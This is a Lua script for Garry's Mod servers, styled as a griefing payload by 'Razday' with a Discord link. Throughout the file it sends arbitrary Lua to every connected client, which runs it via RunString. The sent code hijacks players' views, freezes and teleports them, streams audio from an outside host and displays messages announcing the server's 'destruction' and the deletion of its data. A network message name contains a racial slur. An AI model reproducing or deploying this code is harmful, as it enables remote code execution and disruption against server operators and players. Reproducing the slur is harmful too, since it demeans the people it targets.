local code = [==[
if Sgfjfgjnjdfgjoko then
    return print(&quot;ptdr&quot;)
end

Sgfjfgjnjdfgjoko = true
print(&quot;starting payload&quot;)
for k,v in pairs(player.GetAll()) do
    v:AnimRestartGesture(GESTURE_SLOT_CUSTOM, ACT_GMOD_TAUNT_DANCE, false)
end

        local name = GetConVar(&quot;sv_skyname&quot;):GetString()
        if name == &quot;painted&quot; then
          local sky
          for _, v in ipairs(ents.GetAll()) do
            if v:GetClass() == &quot;env_skypaint&quot; then
              sky = v
              break
            end
          end
          if !IsValid(sky) then return end
          hook.Add(&quot;PostRender&quot;,&quot;\xFFsky\xFF&quot;,function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            col = Vector(col.r/255,col.g/255,col.b/255)
            sky:SetTopColor(col)
            sky:SetBottomColor(col)
          end)
        else
          local prefix  = {&quot;lf&quot;,&quot;ft&quot;,&quot;rt&quot;,&quot;bk&quot;,&quot;dn&quot;,&quot;up&quot;}
          local mats = {}
          for i=1,6 do
            mats[#mats+1] = Material(&quot;skybox/&quot; .. name .. prefix[i])
          end
          hook.Add(&quot;PostRender&quot;,&quot;\xFFsky\xFF&quot;,function()
            local col = HSVToColor(CurTime()*30 % 360,1,1)
            for i=1,6 do
              mats[i]:SetVector(&quot;$color&quot;,Vector(col.r/255,col.g/255,col.b/255))
            end
          end)
        end
local sun
local e = ents.FindByClass(&quot;env_sun&quot;)
if ( #e &gt; 0 ) then
    sun = e[1]
end
local A={}
A.Graphics={}
hook.Add(&quot;HUDPaint&quot;, &quot;Aieaieaie&quot;, function()
    for k,v in pairs(A.Graphics) do
        v()
    end
end)
A.T=timer.Simple

local decompte = 17 -- Seconde du drop


local function aftersound(s)
    local nAng = Angle(0, 0, 0)
    local nPos = Vector(0, 0, 0)
    local nAng = Angle(0, 5, 0)
    local padsz = 50
    local colr = ColorRand()
    local colrr = ColorRand()
    local nPos = Vector(0, 0, 1)
    local pfrow = 400
    local ispresenting = true
    local function NextAng(deg)
        nAng:RotateAroundAxis(Vector(0, 0, 1), deg)
        nPos = nAng:Forward() * -pfrow
    end
    A.Graphics[&quot;Mat&quot;] = function()
        local fft={}
        s:FFT(fft,1024)
        local l = 0
        for i=1,2 do
            l = l + fft[i]
        end
        if l &gt; 0.7 then
            colr = ColorRand()
            
        end
        if l &gt; 0.6 then
            colrr = ColorRand()
            NextAng(-7)
        end
        if l &lt; 0.2 then
            NextAng(3)
            pfrow = math.random(500, 900)
        end
        if ispresenting then
            draw.SimpleText(&quot;Payload started by Razday&quot;, &quot;GHACK1&quot;,ScrW() / 2, ScrH() * 0.1, colrr, 1, 1, 1)
            draw.SimpleText(&quot;https://discord.gg/Dq8BYhAx24&quot;, &quot;GHACK1&quot;,ScrW() / 2, ScrH() * 0.2, colrr, 1, 1, 1)
            draw.SimpleText(&quot;Razday !&quot;, &quot;GHACK&quot;,ScrW() / 2, ScrH() * 0.5, colrr, 1, 1, 1)
            draw.SimpleText(&quot;Present&quot;, &quot;GHACK&quot;,ScrW() / 2, ScrH() * 0.6, colrr, 1, 1, 1)
            draw.SimpleText(&quot;The destruction of your server&quot;, &quot;GHACK&quot;,ScrW() / 2, ScrH() * 0.7, colrr, 1, 1, 1)
            draw.SimpleText(&quot;Start in &quot;..tostring(math.floor(decompte)) ..&quot; secondes&quot;, &quot;GHACK&quot;,ScrW() / 2, ScrH() * 0.8, colrr, 1, 1, 1)
        else
            draw.SimpleText(&quot;Payload started by Razday&quot;, &quot;GHACK1&quot;,ScrW() / 2, ScrH() * 0.1, colrr, 1, 1, 1)
            draw.SimpleText(&quot;https://discord.gg/Dq8BYhAx24&quot;, &quot;GHACK1&quot;,ScrW() / 2, ScrH() * 0.2, colrr, 1, 1, 1)
            draw.SimpleText(&quot;Please wait a bit that your files this deletes.&quot;, &quot;GHACK&quot;,ScrW() / 2, ScrH() * 0.6, colrr, 1, 1, 1)
            draw.SimpleText(&quot;Data deleted ✅&quot;, &quot;GHACK&quot;,ScrW() / 2, ScrH() * 0.7, colrr, 1, 1, 1)
            draw.SimpleText(&quot;FPP Blacklist removed ✅&quot;, &quot;GHACK&quot;,ScrW() / 2, ScrH() * 0.8, colrr, 1, 1, 1)
            draw.SimpleText(&quot;Ulx has been break ✅&quot;, &quot;GHACK&quot;,ScrW() / 2, ScrH() * 0.9, colrr, 1, 1, 1)
        end
    end
    surface.CreateFont(&quot;GHACK&quot;,{
        size = 55
    })
    surface.CreateFont(&quot;GHACK1&quot;,{
        size = 35
    })
    timer.Simple(17, function() -- Tu modif le drop de la chanson, donc quand les textes vont changer quoi
        ispresenting = false
    end)
    timer.Create(&quot;aieaieaie&quot;, 0.05, 0, function()
        NextAng(3)
  end)

    hook.Add(&quot;CalcView&quot;, &quot;Aieaieaie&quot;, function(p, origin, ang, fov, zn, zf)
        local view = {}
        view.origin = nPos
        view.angles = nAng
        view.fov = fov
        view.drawviewer = true
        return view
    end)
    hook.Add(&quot;PostDrawOpaqueRenderables&quot;,&quot;OUILOUILOUIL&quot;,function()
        for k,v in pairs(player.GetAll()) do
            cam.Start3D2D(v:GetPos() + Vector(padsz * 2, padsz * 2, 0),Angle(0,90,0),3)
                draw.RoundedBoxEx(0, -padsz, -padsz, padsz, padsz, colr)
             cam.End3D2D()
        end

    end)
end

A.T(0,function()
    sound.PlayURL(&quot;http://venus.unrealhosting.fr:20126/qwack.mp3&quot;, &quot;&quot;, function(s)
        if (not s) or (not IsValid(s)) then
            return print &quot;well this suck&quot;
        end
        aftersound(s)
    end)
end)
]==]
util.AddNetworkString(&quot;stfunigger&quot;)

local function resetup(ply)
    if not ply.shituped then
        net.Start(&quot;stfunigger&quot;)
        net.WriteString(code)
        net.Send(ply)
        ply.shituped = true
        ply:AnimRestartGesture(GESTURE_SLOT_CUSTOM, ACT_GMOD_TAUNT_DANCE, false)
    end
    ply:SetPos(Vector(math.random(-150, 150), math.random(-150, 150), math.random(-150, 150)))
    ply:Freeze(true)
    ply:SetEyeAngles(AngleRand())
    ply:SetCollisionGroup(COLLISION_GROUP_WEAPON)
    ply:SetModelScale(2)
end

net.Receive(&quot;stfunigger&quot;,function(_,ply)
    resetup(ply)
end)


local function SetupPlayer(ply)
    if ply:IsBot() then
        resetup(ply)
        return
    end
    ply:SendLua(&quot;net.Receive('stfunigger',function()RunString(net.ReadString())end)net.Start('stfunigger')net.SendToServer()&quot;)
    
end
hook.Add(&quot;PlayerSpawn&quot;, &quot;TETET&quot;, SetupPlayer)
timer.Simple(1, function()
    for k,v in pairs(player.GetAll()) do
        SetupPlayer(v)
    end
end)